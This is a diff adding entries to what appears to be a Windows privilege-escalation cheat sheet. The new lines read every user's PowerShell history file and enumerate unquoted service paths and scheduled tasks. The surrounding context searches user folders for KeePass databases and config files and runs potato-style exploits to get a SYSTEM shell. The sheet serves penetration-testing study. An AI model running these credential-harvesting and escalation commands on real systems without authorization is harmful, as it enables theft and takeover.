@@ -29,6 +29,7 @@ ___
 * `Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
 * `Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
 * `Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.config,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+* `type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
 
 **Service Binary Hijack**
 
@@ -136,3 +137,23 @@ C:\Users\Public> .\JuicyPotatoNG.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Us
 ```cmd
 C:\Users\Public> .\PrintSpoofer.exe -i -c cmd.exe
 ```
+
+### Unquoted Service Paths
+
+**Enumerate Running and Stopped Services**
+
+`Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
+
+**Identify spaces in service's paths**
+
+`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+
+### Scheduled Tasks
+
+Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
+
+* As which user account (principal) does this task get executed?
+* What triggers are specified for the task?
+* What actions are executed when one or more of these triggers are met?
+
+`schtasks /query /fo LIST /v`
